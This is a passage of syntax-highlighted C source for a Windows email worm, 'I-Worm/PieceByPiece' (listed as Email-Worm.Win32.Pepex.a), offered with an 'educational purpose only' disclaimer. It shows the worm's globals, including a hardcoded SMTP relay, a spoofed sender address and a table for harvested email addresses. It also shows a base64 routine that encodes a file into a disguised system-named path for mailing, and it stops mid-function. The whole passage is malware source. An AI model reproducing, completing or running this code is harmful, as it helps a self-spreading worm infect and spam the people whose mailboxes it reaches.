<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Pepex.a - PieceByPiece.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*
I-Worm/PieceByPiece Copyright (C) 2002 MI_pirat [Red-Cell] inc.
For educational purpose only. Distribute under GPL.
Some lyrics from the song that inspired me:

    "Cause nothing ever lasts forever
    We're like flowers in this vase, together
    You and me, it's pulling me down
    Tearing my down, piece by piece
    And you can't see
    That's it's like a disease
    Killing me now, it's so hard to breathe"
                    -Feeder &lt;Piece by Piece&gt;
*/</span><span class="sc0">

</span><span class="sc9">#include &lt;winsock.h&gt;
#include &lt;fstream.h&gt;
#include &lt;tlhelp32.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
</span><span class="sc0">
</span><span class="sc2">//--------------------------------------GLOBAL VARIABLES-------------------------------------
</span><span class="sc0">
</span><span class="sc11">HWND</span><span class="sc0"> </span><span class="sc11">hwnd</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">version</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MAKEWORD</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">WSADATA</span><span class="sc0"> </span><span class="sc11">wsaData</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nRet</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">],</span><span class="sc11">myBuf</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">],</span><span class="sc11">ch</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc11">ch2</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">],</span><span class="sc11">server</span><span class="sc10">[]=</span><span class="sc6">"smtp.barrysworld.com"</span><span class="sc10">,</span><span class="sc11">email</span><span class="sc10">[]=</span><span class="sc6">"john@barrysworld.com"</span><span class="sc10">,</span><span class="sc11">helo</span><span class="sc10">[]=</span><span class="sc6">"barrysworld.com"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">emails</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">][</span><span class="sc4">100</span><span class="sc10">],</span><span class="sc11">windir</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">filename</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">winbkup</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">zippth</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">cx</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc11">cx2</span><span class="sc10">[</span><span class="sc4">33</span><span class="sc10">],</span><span class="sc11">buc1</span><span class="sc10">[</span><span class="sc4">8</span><span class="sc10">],</span><span class="sc11">buc2</span><span class="sc10">[</span><span class="sc4">8</span><span class="sc10">],</span><span class="sc11">buc3</span><span class="sc10">[</span><span class="sc4">8</span><span class="sc10">],</span><span class="sc11">xxx</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">SOCKET</span><span class="sc0"> </span><span class="sc11">theSocket</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc11">err</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">c</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">connected</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">tim</span><span class="sc10">,</span><span class="sc11">sending</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">SYSTEMTIME</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">double</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">basesize</span><span class="sc10">,</span><span class="sc11">ProcessId</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc2">//--------------------------------------WNDPROC-----------------------------------------------
</span><span class="sc0">
</span><span class="sc11">LRESULT</span><span class="sc0"> </span><span class="sc11">CALLBACK</span><span class="sc0"> </span><span class="sc11">WndProc</span><span class="sc10">(</span><span class="sc11">HWND</span><span class="sc0"> </span><span class="sc11">hWnd</span><span class="sc10">,</span><span class="sc11">UINT</span><span class="sc0"> </span><span class="sc11">iMsg</span><span class="sc10">,</span><span class="sc11">WPARAM</span><span class="sc0"> </span><span class="sc11">wParam</span><span class="sc10">,</span><span class="sc11">LPARAM</span><span class="sc0"> </span><span class="sc11">lParam</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc2">//--------------------------------------GETASC------------------------------------------------
</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">getasc</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">chr</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">257</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">c</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">chr</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc11">c</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//--------------------------------------BASE64-----------------------------------------------
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">base64</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//Encodes a file using the "base 64" encoding
</span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">fis</span><span class="sc10">;</span><span class="sc0">     </span><span class="sc2">//It's kinna shitty code, but it works just GREAT!
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc11">n</span><span class="sc10">,</span><span class="sc11">done</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">lin</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">double</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc4">7</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">totsize</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">base</span><span class="sc10">[</span><span class="sc4">64</span><span class="sc10">]={</span><span class="sc7">'A'</span><span class="sc10">,</span><span class="sc7">'B'</span><span class="sc10">,</span><span class="sc7">'C'</span><span class="sc10">,</span><span class="sc7">'D'</span><span class="sc10">,</span><span class="sc7">'E'</span><span class="sc10">,</span><span class="sc7">'F'</span><span class="sc10">,</span><span class="sc7">'G'</span><span class="sc10">,</span><span class="sc7">'H'</span><span class="sc10">,</span><span class="sc7">'I'</span><span class="sc10">,</span><span class="sc7">'J'</span><span class="sc10">,</span><span class="sc7">'K'</span><span class="sc10">,</span><span class="sc7">'L'</span><span class="sc10">,</span><span class="sc7">'M'</span><span class="sc10">,</span><span class="sc7">'N'</span><span class="sc10">,</span><span class="sc7">'O'</span><span class="sc10">,</span><span class="sc7">'P'</span><span class="sc10">,</span><span class="sc0">
   
    </span><span class="sc7">'Q'</span><span class="sc10">,</span><span class="sc7">'R'</span><span class="sc10">,</span><span class="sc7">'S'</span><span class="sc10">,</span><span class="sc7">'T'</span><span class="sc10">,</span><span class="sc7">'U'</span><span class="sc10">,</span><span class="sc7">'V'</span><span class="sc10">,</span><span class="sc7">'W'</span><span class="sc10">,</span><span class="sc7">'X'</span><span class="sc10">,</span><span class="sc7">'Y'</span><span class="sc10">,</span><span class="sc7">'Z'</span><span class="sc10">,</span><span class="sc7">'a'</span><span class="sc10">,</span><span class="sc7">'b'</span><span class="sc10">,</span><span class="sc7">'c'</span><span class="sc10">,</span><span class="sc7">'d'</span><span class="sc10">,</span><span class="sc7">'e'</span><span class="sc10">,</span><span class="sc7">'f'</span><span class="sc10">,</span><span class="sc0">
    
    </span><span class="sc7">'g'</span><span class="sc10">,</span><span class="sc7">'h'</span><span class="sc10">,</span><span class="sc7">'i'</span><span class="sc10">,</span><span class="sc7">'j'</span><span class="sc10">,</span><span class="sc7">'k'</span><span class="sc10">,</span><span class="sc7">'l'</span><span class="sc10">,</span><span class="sc7">'m'</span><span class="sc10">,</span><span class="sc7">'n'</span><span class="sc10">,</span><span class="sc7">'o'</span><span class="sc10">,</span><span class="sc7">'p'</span><span class="sc10">,</span><span class="sc7">'q'</span><span class="sc10">,</span><span class="sc7">'r'</span><span class="sc10">,</span><span class="sc7">'s'</span><span class="sc10">,</span><span class="sc7">'t'</span><span class="sc10">,</span><span class="sc7">'u'</span><span class="sc10">,</span><span class="sc7">'v'</span><span class="sc10">,</span><span class="sc0">
    
    </span><span class="sc7">'w'</span><span class="sc10">,</span><span class="sc7">'x'</span><span class="sc10">,</span><span class="sc7">'y'</span><span class="sc10">,</span><span class="sc7">'z'</span><span class="sc10">,</span><span class="sc7">'0'</span><span class="sc10">,</span><span class="sc7">'1'</span><span class="sc10">,</span><span class="sc7">'2'</span><span class="sc10">,</span><span class="sc7">'3'</span><span class="sc10">,</span><span class="sc7">'4'</span><span class="sc10">,</span><span class="sc7">'5'</span><span class="sc10">,</span><span class="sc7">'6'</span><span class="sc10">,</span><span class="sc7">'7'</span><span class="sc10">,</span><span class="sc7">'8'</span><span class="sc10">,</span><span class="sc7">'9'</span><span class="sc10">,</span><span class="sc7">'+'</span><span class="sc10">,</span><span class="sc7">'/'</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc11">fstream</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">,</span><span class="sc11">ios</span><span class="sc10">::</span><span class="sc11">in</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">ios</span><span class="sc10">::</span><span class="sc11">binary</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">g</span><span class="sc10">(</span><span class="sc6">"C:\\Msbootlog.sys"</span><span class="sc10">,</span><span class="sc11">ios</span><span class="sc10">::</span><span class="sc11">out</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">,&amp;</span><span class="sc11">fis</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">totsize</span><span class="sc10">=</span><span class="sc11">fis</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc2">//Get the file size in bytes
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">c</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">c</span><span class="sc10">&lt;</span><span class="sc11">totsize</span><span class="sc10">/</span><span class="sc4">3</span><span class="sc10">;</span><span class="sc11">c</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//Encode 'till no more 3 char chunks are available
</span><span class="sc11">buc1</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">xxx</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">get</span><span class="sc10">(</span><span class="sc11">cx</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc11">j</span><span class="sc10">=</span><span class="sc11">getasc</span><span class="sc10">(&amp;</span><span class="sc11">cx</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc11">itoa</span><span class="sc10">(</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc11">cx2</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">cx2</span><span class="sc10">)&lt;</span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">8</span><span class="sc10">-</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">cx2</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc11">buc1</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc7">'0'</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">buc1</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">buc1</span><span class="sc10">,</span><span class="sc11">cx2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">buc1</span><span class="sc10">,</span><span class="sc11">cx2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">buc2</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">get</span><span class="sc10">(</span><span class="sc11">cx</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc11">j</span><span class="sc10">=</span><span class="sc11">getasc</span><span class="sc10">(&amp;</span><span class="sc11">cx</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc11">itoa</span><span class="sc10">(</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc11">cx2</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">cx2</span><span class="sc10">)&lt;</span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">8</span><span class="sc10">-</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">cx2</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc11">buc2</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc7">'0'</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">buc2</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">buc2</span><span class="sc10">,</span><span class="sc11">cx2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">buc2</span><span class="sc10">,</span><span class="sc11">cx2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">buc3</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">get</span><span class="sc10">(</span><span class="sc11">cx</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc11">j</span><span class="sc10">=</span><span class="sc11">getasc</span><span class="sc10">(&amp;</span><span class="sc11">cx</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc11">itoa</span><span class="sc10">(</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc11">cx2</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">cx2</span><span class="sc10">)&lt;</span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">8</span><span class="sc10">-</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">cx2</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc11">buc3</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc7">'0'</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">buc3</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">buc3</span><span class="sc10">,</span><span class="sc11">cx2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">buc3</span><span class="sc10">,</span><span class="sc11">cx2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">xxx</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">xxx</span><span class="sc10">,</span><span class="sc11">buc1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">done</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">done</span><span class="sc10">!=</span><span class="sc4">24</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">done</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">done</span><span class="sc10">+</span><span class="sc4">6</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]=</span><span class="sc11">xxx</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">k</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">done</span><span class="sc10">+=</span><span class="sc4">6</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">n</span><span class="sc10">=</span><span class="sc11">strtol</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">g</span><span class="sc10">&lt;&lt;</span><span class="sc11">base</span><span class="sc10">[</span><span class="sc11">n</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">lin</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lin</span><span class="sc10">==</span><span class="sc4">76</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">g</span><span class="sc10">&lt;&lt;</span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc11">lin</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//One char left so add 4 0s at the end
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">totsize</span><span class="sc10">%</span><span class="sc4">3</span><span class="sc10">==</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">buc1</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">get</span><span class="sc10">(</span><span class="sc11">cx</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc11">j</span><span class="sc10">=</span><span class="sc11">getasc</span><span class="sc10">(&amp;</span><span class="sc11">cx</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc11">itoa</span><span class="sc10">(</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc11">cx2</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">cx2</span><span class="sc10">)&lt;</span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">8</span><span class="sc10">-</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">cx2</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc11">buc1</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc7">'0'</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">buc1</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">buc1</span><span class="sc10">,</span><span class="sc11">cx2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">buc1</span><span class="sc10">,</span><span class="sc11">cx2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">buc1</span><span class="sc10">,</span><span class="sc6">"0000"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">done</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">done</span><span class="sc10">!=</span><span class="sc4">12</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">done</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">done</span><span class="sc10">+</span><span class="sc4">6</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]=</span><span class="sc11">buc1</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">k</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">done</span><span class="sc10">+=</span><span class="sc4">6</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">n</span><span class="sc10">=</span><span class="sc11">strtol</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">g</span><span class="sc10">&lt;&lt;</span><span class="sc11">base</span><span class="sc10">[</span><span class="sc11">n</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">lin</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lin</span><span class="sc10">==</span><span class="sc4">76</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">g</span><span class="sc10">&lt;&lt;</span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc11">lin</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">g</span><span class="sc10">&lt;&lt;</span><span class="sc6">"=="</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//Two chars left so add 2 0s at the end
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">totsize</span><span class="sc10">%</span><span class="sc4">3</span><span class="sc10">==</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
